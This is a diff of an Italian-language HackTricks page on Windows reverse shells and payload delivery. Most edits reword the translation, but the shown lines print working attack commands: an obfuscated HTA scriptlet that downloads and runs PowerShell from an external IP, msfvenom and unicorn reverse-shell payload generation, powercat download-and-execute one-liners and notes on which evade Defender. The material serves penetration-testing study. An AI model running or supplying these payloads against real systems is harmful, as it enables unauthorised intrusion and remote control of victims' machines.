@@ -16,7 +16,7 @@ Altri modi per supportare HackTricks:
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -92,7 +92,7 @@ Payload scritto su disco: **NO** (_almeno da nessuna parte che ho potuto trovare
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
-Processo che effettua la chiamata di rete: **svchost.exe**\
+Processo che effettua chiamate di rete: **svchost.exe**\
 Payload scritto su disco: **cache locale del client WebDAV**
 
 **Una riga:**
@@ -115,7 +115,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Esempio di shell inversa hta-psh (usa hta per scaricare ed eseguire il backdoor di PS)**
+#### **Esempio di shell inversa hta-psh (utilizzo di hta per scaricare ed eseguire il backdoor di PS)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -157,8 +157,6 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 </scriptlet>
 ```
 #### **Mshta - Metasploit**
-
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This technique can be used to bypass application whitelisting and execute code on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -285,13 +283,13 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Rilevato da Defender**
+**Rilevato dal difensore**
 
 ## PS-Bat
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Process che effettua una chiamata di rete: **svchost.exe**\
+Process che effettua la chiamata di rete: **svchost.exe**\
 Payload scritto su disco: **cache locale del client WebDAV**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
@@ -301,7 +299,7 @@ impacket-smbserver -smb2support kali `pwd`
 ```bash
 \\10.8.0.3\kali\shell.bat
 ```
-**Rilevato dal difensore**
+**Rilevato da Defender**
 
 ## **MSIExec**
 
@@ -357,7 +355,7 @@ Compilare il codice C# nella macchina vittima.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Puoi scaricare una shell inversa C# di base da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Puoi scaricare una shell inversa di base in C# da qui: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Non rilevato**
 
@@ -397,7 +395,7 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Defender non lo rileva come codice maligno (almeno fino al 3/04/2019).
 
-**TODO: Controllare altre shell di nishang**
+**DA FARE: Controllare altre shell nishang**
 
 ### **PS-Powercat**
 
@@ -407,11 +405,9 @@ Scarica, avvia un server web, avvia il listener ed eseguilo sul computer della v
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-Defender non lo rileva come codice maligno (ancora, 3/04/2019).
-
 **Altre opzioni offerte da powercat:**
 
-Shell di bind, Shell inversa (TCP, UDP, DNS), Reindirizzamento di porta, upload/download, Generare payload, Servire file...
+Shell di bind, shell inversa (TCP, UDP, DNS), reindirizzamento di porta, caricamento/scaricamento, Generare payload, Servire file...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -436,13 +432,13 @@ Crea un lanciatore powershell, salvandolo in un file e scaricalo ed eseguilo.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Codice rilevato come dannoso**
+**Codice rilevato come maligno**
 
 ### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Crea una versione di powershell del backdoor di metasploit utilizzando unicorn
+Crea una versione in powershell di una backdoor di metasploit utilizzando unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -450,7 +446,7 @@ Avvia msfconsole con la risorsa creata:
 ```
 msfconsole -r unicorn.rc
 ```
-Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nella vittima:
+Avvia un server web che serve il file _powershell\_attack.txt_ e esegui nel computer della vittima:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -474,19 +470,19 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) console PS con alcuni moduli P
 ​
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Altri modi per supportare HackTricks:
 
-* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
+* Se desideri vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
+* Ottieni il [**merchandising ufficiale PEASS & HackTricks**](https://peass.creator-spring.com)
+* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
 * **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repository di Github.
 
